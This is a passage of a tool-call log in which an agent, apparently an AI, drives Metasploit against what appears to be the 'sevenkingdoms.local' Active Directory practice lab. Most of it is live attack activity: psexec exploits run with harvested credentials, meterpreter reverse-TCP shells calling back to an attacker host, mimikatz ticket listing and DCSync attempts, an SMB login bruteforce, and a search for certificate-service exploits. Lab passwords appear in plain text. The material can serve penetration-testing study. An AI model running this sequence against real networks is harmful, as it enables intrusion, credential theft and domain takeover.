{"type":"exploit","name":"windows/smb/psexec","options":{"RHOSTS":"kingslanding.sevenkingdoms.local","SMBUser":"tyrion.lannister","SMBPass":"powerkingftw135","SMBDomain":"SEVENKINGDOMS","PAYLOAD":"windows/x64/meterpreter/reverse_tcp","LHOST":"10.50.0.1","LPORT":"4449"}}
```

**Output:**
```
Module launched as job null. Use msf_job_info to check status.
```

---

#### ✅ msf_module_execute
*2025-12-17 12:04:55* | Target: `10.50.0.11` | Duration: 1295ms

**Input:**
```json
{"type":"exploit","name":"windows/smb/psexec","options":{"RHOSTS":"10.50.0.11","SMBUser":"sql_svc","SMBPass":"YouWillNotKerboroast1ngMeeeeee","SMBDomain":"NORTH","PAYLOAD":"windows/x64/meterpreter/reverse_tcp","LHOST":"10.50.0.1","LPORT":"4450"}}
```

**Output:**
```
Module launched as job 7. Use msf_job_info to check status.
```

---

### Phase: enumeration

#### ✅ msf_sessions_list
*2025-12-17 12:05:01* | Duration: 6ms

**Input:**
```json
{}
```

**Output:**
```
[
  {
    "id": "1",
    "type": "meterpreter",
    "info": "NORTH\\jon.snow @ CASTELBLACK",
    "tunnel": "10.50.0.1:4444 -> 10.50.0.22:52916",
    "via": "exploit/multi/handler",
    "target": ""
  },
  {
    "id": "3",
    "type": "meterpreter",
    "info": "NT AUTHORITY\\SYSTEM @ CASTELBLACK",
    "tunnel": "10.50.0.1:4446 -> 10.50.0.22:52949",
    "via": "exploit/windows/smb/psexec",
    "target": "10.50.0.22"
  }
]
```

---

### Phase: post_exploitation

#### ✅ msf_session_interact
*2025-12-17 12:05:10* | Target: `3` | Duration: 513ms

**Input:**
```json
{"id":3,"type":"meterpreter","command":"dsquery * -filter \"(description=*)\" -attr samaccountname description -limit 50"}
```

**Output:**
```
dsquery * -filter "(description=*)" -attr samaccountname description -limit 50
'dsquery' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32>
```

---

#### ✅ msf_session_interact
*2025-12-17 12:05:19* | Target: `3` | Duration: 510ms

**Input:**
```json
{"id":3,"type":"meterpreter","command":"powershell -ep bypass -c \"Get-WmiObject -Query 'SELECT * FROM Win32_UserAccount WHERE Domain=\\\"NORTH\\\"' | Select Name,Description | Format-Table -AutoSize\""}
```

**Output:**
```
powershell -ep bypass -c "Get-WmiObject -Query 'SELECT * FROM Win32_UserAccount WHERE Domain=\"NORTH\"' | Select Name,Description | Format-Table -AutoSize"

```

---

#### ✅ msf_session_interact
*2025-12-17 12:05:27* | Target: `3` | Duration: 510ms

**Input:**
```json
{"id":3,"type":"meterpreter","command":"findstr /si cpassword \\\\winterfell\\SYSVOL\\north.sevenkingdoms.local\\Policies\\*.xml"}
```

**Output:**
```

Name          Description                                             
----          -----------                                             
Administrator Built-in account for administering the computer/domain  
Guest         Built-in account for guest access to the computer/domain
krbtgt        Key Distribution Center Service Account                 
vagrant       Vagrant User                                            
arya.stark    Arya Stark                                              
eddard.stark  Eddard Stark                                            
catelyn.stark Catelyn Stark                                           
robb.stark    Robb Stark                                              
sansa.stark   Sansa Stark                                             
brandon.stark Brandon Stark                                           
rickon.stark  Rickon Stark                                            
hodor         Brainless Giant                                         
jon.snow      Jon Snow                                                
samwell.tarly Samwell Tarly (Password : Heartsbane)                   
jeor.mormont  Jeor Mormont                                            
sql_svc       sql service                                             



C:\Windows\system32>findstr /si cpassword \\winterfell\SYSVOL\north.sevenkingdoms.local\Policies\*.xml

C:\Windows\system32>
```

---

#### ✅ msf_session_interact
*2025-12-17 12:05:38* | Target: `3` | Duration: 509ms

**Input:**
```json
{"id":3,"type":"meterpreter","command":"net user samwell.tarly /domain"}
```

**Output:**
```
net user samwell.tarly /domain
The request will be processed at a domain controller for domain north.sevenkingdoms.local.

User name                    samwell.tarly
Full Name                    
Comment                      Samwell Tarly (Password : Heartsbane)
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            12/12/2025 1:00:50 AM
Password expires             Never
Password changeable          12/13/2025 1:00:50 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         *Night Watch          
The command completed successfully.


C:\Windows\system32>
```

---

#### ✅ msf_session_interact
*2025-12-17 12:05:47* | Target: `3` | Duration: 511ms

**Input:**
```json
{"id":3,"type":"meterpreter","command":"certutil -config - -ping"}
```

**Output:**
```
certutil -config - -ping

```

---

#### ✅ msf_session_interact
*2025-12-17 12:05:56* | Target: `3` | Duration: 510ms

**Input:**
```json
{"id":3,"type":"meterpreter","command":"exit"}
```

**Output:**
```
(no output)
```

---

### Phase: enumeration

#### ✅ msf_sessions_list
*2025-12-17 12:06:03* | Duration: 5ms

**Input:**
```json
{}
```

**Output:**
```
[
  {
    "id": "1",
    "type": "meterpreter",
    "info": "NORTH\\jon.snow @ CASTELBLACK",
    "tunnel": "10.50.0.1:4444 -> 10.50.0.22:52916",
    "via": "exploit/multi/handler",
    "target": ""
  },
  {
    "id": "3",
    "type": "meterpreter",
    "info": "NT AUTHORITY\\SYSTEM @ CASTELBLACK",
    "tunnel": "10.50.0.1:4446 -> 10.50.0.22:52949",
    "via": "exploit/windows/smb/psexec",
    "target": "10.50.0.22"
  }
]
```

---

### Phase: exploitation

#### ❌ msf_module_execute
*2025-12-17 12:06:09* | Target: `10.50.0.11` | Duration: 16ms

**Input:**
```json
{"type":"auxiliary","name":"gather/kerberos_enumusers","options":{"RHOSTS":"10.50.0.11","DOMAIN":"north.sevenkingdoms.local","USER_FILE":"/usr/share/wordlists/seclists/Usernames/Names/names.txt"}}
```

**Output:**
```
Error: MSF Error: true
```

---

### Phase: post_exploitation

#### ✅ msf_session_interact
*2025-12-17 12:07:25* | Target: `3` | Duration: 512ms

**Input:**
```json
{"id":3,"type":"meterpreter","command":"shell"}
```

**Output:**
```
(no output)
```

---

#### ✅ msf_session_interact
*2025-12-17 12:07:30* | Target: `3` | Duration: 509ms

**Input:**
```json
{"id":3,"type":"meterpreter","command":"getuid"}
```

**Output:**
```
(no output)
```

---

### Phase: enumeration

#### ✅ msf_sessions_list
*2025-12-17 12:07:36* | Duration: 6ms

**Input:**
```json
{}
```

**Output:**
```
[
  {
    "id": "1",
    "type": "meterpreter",
    "info": "NORTH\\jon.snow @ CASTELBLACK",
    "tunnel": "10.50.0.1:4444 -> 10.50.0.22:52916",
    "via": "exploit/multi/handler",
    "target": ""
  },
  {
    "id": "3",
    "type": "meterpreter",
    "info": "NT AUTHORITY\\SYSTEM @ CASTELBLACK",
    "tunnel": "10.50.0.1:4446 -> 10.50.0.22:52949",
    "via": "exploit/windows/smb/psexec",
    "target": "10.50.0.22"
  }
]
```

---

### Phase: exploitation

#### ✅ msf_module_execute
*2025-12-17 12:07:42* | Target: `10.50.0.22` | Duration: 1305ms

**Input:**
```json
{"type":"exploit","name":"windows/smb/psexec","options":{"RHOSTS":"10.50.0.22","SMBUser":"jeor.mormont","SMBPass":"_L0ngCl@w_","SMBDomain":"NORTH","PAYLOAD":"windows/x64/meterpreter/reverse_tcp","LHOST":"10.50.0.1","LPORT":"4451"}}
```

**Output:**
```
Module launched as job 8. Use msf_job_info to check status.
```

---

### Phase: enumeration

#### ✅ msf_sessions_list
*2025-12-17 12:07:49* | Duration: 6ms

**Input:**
```json
{}
```

**Output:**
```
[
  {
    "id": "1",
    "type": "meterpreter",
    "info": "NORTH\\jon.snow @ CASTELBLACK",
    "tunnel": "10.50.0.1:4444 -> 10.50.0.22:52916",
    "via": "exploit/multi/handler",
    "target": ""
  },
  {
    "id": "3",
    "type": "meterpreter",
    "info": "NT AUTHORITY\\SYSTEM @ CASTELBLACK",
    "tunnel": "10.50.0.1:4446 -> 10.50.0.22:52949",
    "via": "exploit/windows/smb/psexec",
    "target": "10.50.0.22"
  },
  {
    "id": "4",
    "type": "meterpreter",
    "info": "NT AUTHORITY\\SYSTEM @ CASTELBLACK",
    "tunnel": "10.50.0.1:4451 -> 10.50.0.22:52986",
    "via": "exploit/windows/smb/psexec",
    "target": "10.50.0.22"
  }
]
```

---

### Phase: post_exploitation

#### ✅ msf_session_interact
*2025-12-17 12:07:56* | Target: `4` | Duration: 552ms

**Input:**
```json
{"id":4,"type":"meterpreter","command":"shell"}
```

**Output:**
```
Process 5784 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1935]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

---

#### ✅ msf_session_interact
*2025-12-17 12:08:04* | Target: `4` | Duration: 510ms

**Input:**
```json
{"id":4,"type":"meterpreter","command":"powershell -ep bypass -c \"Get-ADComputer CASTELBLACK -Properties TrustedForDelegation,msDS-AllowedToDelegateTo | Select Name,TrustedForDelegation,msDS-AllowedToDelegateTo\""}
```

**Output:**
```
powershell -ep bypass -c "Get-ADComputer CASTELBLACK -Properties TrustedForDelegation,msDS-AllowedToDelegateTo | Select Name,TrustedForDelegation,msDS-AllowedToDelegateTo"

```

---

#### ❌ msf_session_interact
*2025-12-17 12:08:15* | Target: `4` | Duration: 509ms

**Input:**
```json
{"id":4,"type":"meterpreter","command":"exit"}
```

**Output:**
```
Get-ADComputer : The term 'Get-ADComputer' is not recognized as the name of a cmdlet, function, script file, or 
operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try 
again.
At line:1 char:1
+ Get-ADComputer CASTELBLACK -Properties TrustedForDelegation,msDS-Allo ...
+ ~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Get-ADComputer:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
 

C:\Windows\system32>exit

```

---

#### ✅ msf_session_interact
*2025-12-17 12:08:24* | Target: `4` | Duration: 712ms

**Input:**
```json
{"id":4,"type":"meterpreter","command":"load kiwi"}
```

**Output:**
```
Loading extension kiwi...
```

---

#### ✅ msf_session_interact
*2025-12-17 12:08:30* | Target: `4` | Duration: 509ms

**Input:**
```json
{"id":4,"type":"meterpreter","command":"kiwi_cmd \"kerberos::list\""}
```

**Output:**
```

  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.

[00000000] - 0x00000017 - rc4_hmac_nt      
   Start/End/MaxRenew: 12/17/2025 4:03:13 AM ; 12/17/2025 8:18:16 AM ; 12/19/2025 1:46:14 AM
   Server Name       : krbtgt/SEVENKINGDOMS.LOCAL @ NORTH.SEVENKINGDOMS.LOCAL
   Client Name       : castelblack$ @ NORTH.SEVENKINGDOMS.LOCAL
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 

[00000001] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 12/16/2025 11:36:00 PM ; 12/17/2025 8:18:16 AM ; 12/19/2025 1:46:14 AM
   Server Name       : krbtgt/NORTH.SEVENKINGDOMS.LOCAL @ NORTH.SEVENKINGDOMS.LOCAL
   Client Name       : castelblack$ @ NORTH.SEVENKINGDOMS.LOCAL
   Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; 

[00000002] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 12/16/2025 10:18:16 PM ; 12/17/2025 8:18:16 AM ; 12/19/2025 1:46:14 AM
   Server Name       : krbtgt/NORTH.SEVENKINGDOMS.LOCAL @ NORTH.SEVENKINGDOMS.LOCAL
   Client Name       : castelblack$ @ NORTH.SEVENKINGDOMS.LOCAL
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 

[00000003] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 12/17/2025 4:03:51 AM ; 12/17/2025 8:18:16 AM ; 12/19/2025 1:46:14 AM
   Server Name       : cifs/winterfell @ NORTH.SEVENKINGDOMS.LOCAL
   Client Name       : castelblack$ @ NORTH.SEVENKINGDOMS.LOCAL
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 

[00000004] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 12/17/2025 4:03:13 AM ; 12/17/2025 8
... (truncated)
```

---

#### ❌ msf_session_interact
*2025-12-17 12:08:39* | Target: `4` | Duration: 512ms

**Input:**
```json
{"id":4,"type":"meterpreter","command":"kiwi_cmd \"tgs::s4u /tgt:0-40e10000-castelblack$@krbtgt~NORTH.SEVENKINGDOMS.LOCAL-NORTH.SEVENKINGDOMS.LOCAL.kirbi /user:Administrator /service:cifs/winterfell.north.sevenkingdoms.local\""}
```

**Output:**
```
ERROR mimikatz_doLocal ; "tgs" module not found !

        standard  -  Standard module  [Basic commands (does not require module name)]
          crypto  -  Crypto Module
        sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials...]
        kerberos  -  Kerberos package module  []
             ngc  -  Next Generation Cryptography module (kiwi use only)  [Some commands to enumerate credentials...]
       privilege  -  Privilege module
         process  -  Process module
         service  -  Service module
         lsadump  -  LsaDump module
              ts  -  Terminal Server module
           event  -  Event module
            misc  -  Miscellaneous module
           token  -  Token manipulation module
           vault  -  Windows Vault/Credential module
     minesweeper  -  MineSweeper module
             net  -  
           dpapi  -  DPAPI Module (by API or RAW access)  [Data Protection application programming interface]
          sysenv  -  System Environment Value module
             sid  -  Security Identifiers module
             iis  -  IIS XML Config module
             rpc  -  RPC control of mimikatz
            sr98  -  RF module for SR98 device and T5577 target
             rdm  -  RF module for RDM(830 AL) device
             acr  -  ACR Module


```

---

#### ❌ msf_session_interact
*2025-12-17 12:08:45* | Target: `4` | Duration: 509ms

**Input:**
```json
{"id":4,"type":"meterpreter","command":"kiwi_cmd \"kerberos::s4u\""}
```

**Output:**
```
ERROR mimikatz_doLocal ; "s4u" command of "kerberos" module not found !

Module :	kerberos
Full name :	Kerberos package module
Description :	

             ptt  -  Pass-the-ticket [NT 6]
            list  -  List ticket(s)
             ask  -  Ask or get TGS tickets
             tgt  -  Retrieve current TGT
           purge  -  Purge ticket(s)
          golden  -  Willy Wonka factory
            hash  -  Hash password to keys
             ptc  -  Pass-the-ccache [NT6]
           clist  -  List tickets in MIT/Heimdall ccache


```

---

#### ✅ msf_session_interact
*2025-12-17 12:08:53* | Target: `4` | Duration: 510ms

**Input:**
```json
{"id":4,"type":"meterpreter","command":"shell"}
```

**Output:**
```
Process 7608 created.
Channel 2 created.
Microsoft Windows [Version 10.0.17763.1935]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

---

#### ✅ msf_session_interact
*2025-12-17 12:09:00* | Target: `4` | Duration: 508ms

**Input:**
```json
{"id":4,"type":"meterpreter","command":"dir \\\\winterfell\\C$"}
```

**Output:**
```
dir \\winterfell\C$
Access is denied.

C:\Windows\system32>
```

---

#### ✅ msf_session_interact
*2025-12-17 12:09:12* | Target: `4` | Duration: 513ms

**Input:**
```json
{"id":4,"type":"meterpreter","command":"exit"}
```

**Output:**
```
exit

```

---

#### ❌ msf_session_interact
*2025-12-17 12:09:18* | Target: `4` | Duration: 508ms

**Input:**
```json
{"id":4,"type":"meterpreter","command":"kiwi_cmd \"lsadump::dcsync /domain:north.sevenkingdoms.local /user:Administrator\""}
```

**Output:**
```
[DC] 'north.sevenkingdoms.local' will be the domain
[DC] 'winterfell.north.sevenkingdoms.local' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
ERROR kull_m_rpc_drsr_CrackName ; CrackNames (name status): 0x00000003 (3) - ERROR_NOT_UNIQUE


```

---

#### ❌ msf_session_interact
*2025-12-17 12:09:25* | Target: `4` | Duration: 509ms

**Input:**
```json
{"id":4,"type":"meterpreter","command":"kiwi_cmd \"lsadump::dcsync /domain:north.sevenkingdoms.local /user:NORTH\\\\Administrator\""}
```

**Output:**
```
[DC] 'north.sevenkingdoms.local' will be the domain
[DC] 'winterfell.north.sevenkingdoms.local' will be the DC server
[DC] 'NORTH\Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x000020f7 (8439)


```

---

### Phase: enumeration

#### ✅ msf_sessions_list
*2025-12-17 12:10:31* | Duration: 9ms

**Input:**
```json
{}
```

**Output:**
```
[
  {
    "id": "1",
    "type": "meterpreter",
    "info": "NORTH\\jon.snow @ CASTELBLACK",
    "tunnel": "10.50.0.1:4444 -> 10.50.0.22:52916",
    "via": "exploit/multi/handler",
    "target": ""
  },
  {
    "id": "3",
    "type": "meterpreter",
    "info": "NT AUTHORITY\\SYSTEM @ CASTELBLACK",
    "tunnel": "10.50.0.1:4446 -> 10.50.0.22:52949",
    "via": "exploit/windows/smb/psexec",
    "target": "10.50.0.22"
  },
  {
    "id": "4",
    "type": "meterpreter",
    "info": "NT AUTHORITY\\SYSTEM @ CASTELBLACK",
    "tunnel": "10.50.0.1:4451 -> 10.50.0.22:52986",
    "via": "exploit/windows/smb/psexec",
    "target": "10.50.0.22"
  }
]
```

---

#### ✅ msf_module_search
*2025-12-17 12:10:36* | Duration: 78ms

**Input:**
```json
{"query":"spoolsample print"}
```

**Output:**
```
No modules found matching query.
```

---

### Phase: post_exploitation

#### ✅ msf_session_interact
*2025-12-17 12:10:43* | Target: `4` | Duration: 512ms

**Input:**
```json
{"id":4,"type":"meterpreter","command":"shell"}
```

**Output:**
```
Process 3668 created.
Channel 3 created.
Microsoft Windows [Version 10.0.17763.1935]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

---

#### ❌ msf_session_interact
*2025-12-17 12:10:49* | Target: `4` | Duration: 511ms

**Input:**
```json
{"id":4,"type":"meterpreter","command":"sc \\\\\\\\winterfell.north.sevenkingdoms.local query spooler"}
```

**Output:**
```
sc \\\\winterfell.north.sevenkingdoms.local query spooler
[SC] OpenSCManager FAILED 1707:

The network address is invalid.


C:\Windows\system32>
```

---

#### ✅ msf_session_interact
*2025-12-17 12:10:54* | Target: `4` | Duration: 509ms

**Input:**
```json
{"id":4,"type":"meterpreter","command":"sc \\\\winterfell query spooler"}
```

**Output:**
```
sc \\winterfell query spooler

SERVICE_NAME: spooler 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Windows\system32>
```

---

#### ✅ msf_session_interact
*2025-12-17 12:11:02* | Target: `4` | Duration: 509ms

**Input:**
```json
{"id":4,"type":"meterpreter","command":"certutil -config - -ping"}
```

**Output:**
```
certutil -config - -ping

```

---

#### ✅ msf_session_interact
*2025-12-17 12:11:07* | Target: `4` | Duration: 509ms

**Input:**
```json
{"id":4,"type":"meterpreter","command":"nltest /dclist:sevenkingdoms.local"}
```

**Output:**
```
(no output)
```

---

#### ✅ msf_session_interact
*2025-12-17 12:11:11* | Target: `4` | Duration: 4ms

**Input:**
```json
{"id":4,"type":"meterpreter"}
```

**Output:**
```
(no output)
```

---

#### ✅ msf_session_interact
*2025-12-17 12:11:16* | Target: `4` | Duration: 509ms

**Input:**
```json
{"id":4,"type":"meterpreter","command":"exit"}
```

**Output:**
```
(no output)
```

---

#### ✅ msf_session_interact
*2025-12-17 12:11:21* | Target: `3` | Duration: 507ms

**Input:**
```json
{"id":3,"type":"meterpreter","command":"shell"}
```

**Output:**
```
(no output)
```

---

### Phase: enumeration

#### ✅ msf_console_list
*2025-12-17 12:11:28* | Duration: 5ms

**Input:**
```json
{}
```

**Output:**
```
{
  "consoles": [
    {
      "id": "1",
      "prompt": "msf exploit(multi/handler) > ",
      "busy": false
    }
  ]
}
```

---

### Phase: post_exploitation

#### ✅ msf_console_execute
*2025-12-17 12:11:45* | Target: `1` | Duration: 30202ms

**Input:**
```json
{"id":"1","command":"sessions -i 3"}
```

**Output:**
```
[*] Sending stage (230982 bytes) to 10.50.0.22
[*] Meterpreter session 1 opened (10.50.0.1:4444 -> 10.50.0.22:52916) at 2025-12-17 11:39:57 +0000
[*] Meterpreter session 2 opened (10.50.0.1:4445 -> 10.50.0.22:52944) at 2025-12-17 12:00:46 +0000
[*] 10.50.0.22 - Meterpreter session 2 closed.  Reason: Died
[*] Meterpreter session 3 opened (10.50.0.1:4446 -> 10.50.0.22:52949) at 2025-12-17 12:02:42 +0000
[*] Meterpreter session 4 opened (10.50.0.1:4451 -> 10.50.0.22:52986) at 2025-12-17 12:07:48 +0000
[*] Starting interaction with 3...


```

---

#### ✅ msf_console_execute
*2025-12-17 12:12:19* | Target: `1` | Duration: 30190ms

**Input:**
```json
{"id":"1","command":"execute -f cmd.exe -a \"/c nltest /dclist:sevenkingdoms.local\" -H"}
```

**Output:**
```
Process 4308 created.

```

---

#### ✅ msf_console_execute
*2025-12-17 12:12:54* | Target: `1` | Duration: 30207ms

**Input:**
```json
{"id":"1","command":"execute -f powershell.exe -a \"-c \\\"([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()\\\"\" -i -H"}
```

**Output:**
```
Process 8168 created.
Channel 2 created.

SourceName                TargetName            TrustType TrustDirection
----------                ----------            --------- --------------
north.sevenkingdoms.local sevenkingdoms.local ParentChild  Bidirectional



```

---

#### ✅ msf_console_execute
*2025-12-17 12:13:32* | Target: `1` | Duration: 30220ms

**Input:**
```json
{"id":"1","command":"execute -f powershell.exe -a \"-c \\\"$searcher = New-Object DirectoryServices.DirectorySearcher; $searcher.SearchRoot = [ADSI]'LDAP://DC=sevenkingdoms,DC=local'; $searcher.Filter = '(&(objectClass=user)(samaccountname=*))'; $searcher.FindAll() | ForEach-Object { $_.Properties['samaccountname'] }\\\"\" -i -H"}
```

**Output:**
```
Process 4588 created.
Channel 3 created.
Administrator
Guest
vagrant
KINGSLANDING$
krbtgt
NORTH$
ESSOS$
tywin.lannister
jaime.lannister
cersei.lannister
tyron.lannister
robert.baratheon
joffrey.baratheon
renly.baratheon
stannis.baratheon
petyer.baelish
lord.varys
maester.pycelle
DRAGONSTONE$

```

---

#### ✅ msf_console_execute
*2025-12-17 12:14:10* | Target: `1` | Duration: 515ms

**Input:**
```json
{"id":"1","command":"background"}
```

**Output:**
```
[*] Backgrounding session 3...

```

---

#### ✅ msf_console_execute
*2025-12-17 12:14:15* | Target: `1` | Duration: 509ms

**Input:**
```json
{"id":"1","command":"use auxiliary/scanner/smb/smb_login"}
```

**Output:**
```
[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session

```

---

#### ✅ msf_console_execute
*2025-12-17 12:14:20* | Target: `1` | Duration: 509ms

**Input:**
```json
{"id":"1","command":"set RHOSTS 10.50.0.10"}
```

**Output:**
```
RHOSTS => 10.50.0.10

```

---

#### ✅ msf_console_execute
*2025-12-17 12:14:25* | Target: `1` | Duration: 511ms

**Input:**
```json
{"id":"1","command":"set SMBUser tyron.lannister"}
```

**Output:**
```
SMBUser => tyron.lannister

```

---

#### ✅ msf_console_execute
*2025-12-17 12:14:30* | Target: `1` | Duration: 509ms

**Input:**
```json
{"id":"1","command":"set SMBPass powerkingftw135"}
```

**Output:**
```
SMBPass => powerkingftw135

```

---

#### ✅ msf_console_execute
*2025-12-17 12:14:34* | Target: `1` | Duration: 510ms

**Input:**
```json
{"id":"1","command":"set SMBDomain SEVENKINGDOMS"}
```

**Output:**
```
SMBDomain => SEVENKINGDOMS

```

---

#### ❌ msf_console_execute
*2025-12-17 12:14:40* | Target: `1` | Duration: 508ms

**Input:**
```json
{"id":"1","command":"run"}
```

**Output:**
```
[*] 10.50.0.10:445        - 10.50.0.10:445        - Starting SMB login bruteforce
[-] 10.50.0.10:445        - 10.50.0.10:445        - Failed: 'SEVENKINGDOMS\tyron.lannister:powerkingftw135',
[*] 10.50.0.10:445        - Scanned 1 of 1 hosts (100% complete)
[*] 10.50.0.10:445        - Bruteforce completed, 0 credentials were successful.
[*] 10.50.0.10:445        - You can open an SMB session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed

```

---

#### ✅ msf_console_execute
*2025-12-17 12:14:46* | Target: `1` | Duration: 511ms

**Input:**
```json
{"id":"1","command":"set SMBUser tywin.lannister"}
```

**Output:**
```
SMBUser => tywin.lannister

```

---

#### ✅ msf_console_execute
*2025-12-17 12:14:50* | Target: `1` | Duration: 509ms

**Input:**
```json
{"id":"1","command":"run"}
```

**Output:**
```
[*] 10.50.0.10:445        - 10.50.0.10:445        - Starting SMB login bruteforce
[+] 10.50.0.10:445        - 10.50.0.10:445        - Success: 'SEVENKINGDOMS\tywin.lannister:powerkingftw135'
[*] 10.50.0.10:445        - Scanned 1 of 1 hosts (100% complete)
[*] 10.50.0.10:445        - Bruteforce completed, 1 credential was successful.
[*] 10.50.0.10:445        - You can open an SMB session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed

```

---

#### ✅ msf_console_execute
*2025-12-17 12:14:59* | Target: `1` | Duration: 1136ms

**Input:**
```json
{"id":"1","command":"use exploit/windows/smb/psexec"}
```

**Output:**
```
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST

```

---

#### ✅ msf_console_execute
*2025-12-17 12:15:04* | Target: `1` | Duration: 510ms

**Input:**
```json
{"id":"1","command":"set RHOSTS 10.50.0.10"}
```

**Output:**
```
RHOSTS => 10.50.0.10

```

---

#### ✅ msf_console_execute
*2025-12-17 12:15:09* | Target: `1` | Duration: 510ms

**Input:**
```json
{"id":"1","command":"set SMBUser tywin.lannister"}
```

**Output:**
```
SMBUser => tywin.lannister

```

---

#### ✅ msf_console_execute
*2025-12-17 12:15:13* | Target: `1` | Duration: 508ms

**Input:**
```json
{"id":"1","command":"set SMBPass powerkingftw135"}
```

**Output:**
```
SMBPass => powerkingftw135

```

---

#### ✅ msf_console_execute
*2025-12-17 12:15:17* | Target: `1` | Duration: 509ms

**Input:**
```json
{"id":"1","command":"set SMBDomain SEVENKINGDOMS"}
```

**Output:**
```
SMBDomain => SEVENKINGDOMS

```

---

#### ✅ msf_console_execute
*2025-12-17 12:15:21* | Target: `1` | Duration: 509ms

**Input:**
```json
{"id":"1","command":"set LHOST 10.50.0.1"}
```

**Output:**
```
LHOST => 10.50.0.1

```

---

#### ✅ msf_console_execute
*2025-12-17 12:15:26* | Target: `1` | Duration: 507ms

**Input:**
```json
{"id":"1","command":"set LPORT 4452"}
```

**Output:**
```
LPORT => 4452

```

---

#### ❌ msf_console_execute
*2025-12-17 12:15:30* | Target: `1` | Duration: 1154ms

**Input:**
```json
{"id":"1","command":"run"}
```

**Output:**
```
[*] Started reverse TCP handler on 10.50.0.1:4452 
[*] 10.50.0.10:445 - Connecting to the server...
[*] 10.50.0.10:445 - Authenticating to 10.50.0.10:445|SEVENKINGDOMS as user 'tywin.lannister'...
[-] 10.50.0.10:445 - Exploit failed [no-access]: RubySMB::Error::UnexpectedStatusCode The server responded with an unexpected status code: STATUS_ACCESS_DENIED
[*] Exploit completed, but no session was created.

```

---

#### ✅ msf_console_execute
*2025-12-17 12:15:36* | Target: `1` | Duration: 30196ms

**Input:**
```json
{"id":"1","command":"sessions -i 3"}
```

**Output:**
```
[*] Starting interaction with 3...


```

---

#### ✅ msf_console_execute
*2025-12-17 12:16:12* | Target: `1` | Duration: 30208ms

**Input:**
```json
{"id":"1","command":"execute -f powershell.exe -a \"-c \\\"$searcher = New-Object DirectoryServices.DirectorySearcher; $searcher.SearchRoot = [ADSI]'LDAP://DC=sevenkingdoms,DC=local'; $searcher.Filter = '(samaccountname=tywin.lannister)'; $user = $searcher.FindOne(); $user.Properties['memberof']\\\"\" -i -H"}
```

**Output:**
```
Process 7800 created.
Channel 4 created.
CN=Lannister,OU=Westerlands,DC=sevenkingdoms,DC=local

```

---

#### ✅ msf_console_execute
*2025-12-17 12:16:48* | Target: `1` | Duration: 30242ms

**Input:**
```json
{"id":"1","command":"execute -f powershell.exe -a \"-c \\\"$searcher = New-Object DirectoryServices.DirectorySearcher; $searcher.SearchRoot = [ADSI]'LDAP://CN=Configuration,DC=sevenkingdoms,DC=local'; $searcher.Filter = '(objectClass=pKIEnrollmentService)'; $searcher.FindAll() | ForEach-Object { $_.Properties['cn'] + ' - ' + $_.Properties['dnshostname'] }\\\"\" -i -H"}
```

**Output:**
```
Process 7456 created.
Channel 5 created.
SEVENKINGDOMS-CA
 - 
kingslanding.sevenkingdoms.local

```

---

#### ✅ msf_console_execute
*2025-12-17 12:17:27* | Target: `1` | Duration: 511ms

**Input:**
```json
{"id":"1","command":"background"}
```

**Output:**
```
[*] Backgrounding session 3...

```

---

### Phase: enumeration

#### ✅ msf_module_search
*2025-12-17 12:17:31* | Duration: 89ms

**Input:**
```json
{"query":"adcs certificate"}
```

**Output:**
```
[
  {
    "type": "auxiliary",
    "name": "auxiliary/admin/dcerpc/cve_2022_26923_certifried",
    "rank": "normal"
  },
  {
    "type": "auxiliary",
    "name": "auxiliary/admin/dcerpc/esc_update_ldap_object",
    "rank": "normal"
  },
  {
    "type": "auxiliary",
    "name": "auxiliary/gather/ldap_esc_vulnerable_cert_finder",
    "rank": "normal"
  }
]
```

---

#### ✅ msf_module_info
*2025-12-17 12:17:42* | Duration: 24ms

**Input:**
```json
{"type":"auxiliary","name":"auxiliary/gather/ldap_esc_vulnerable_cert_finder"}
```

**Output:**
```
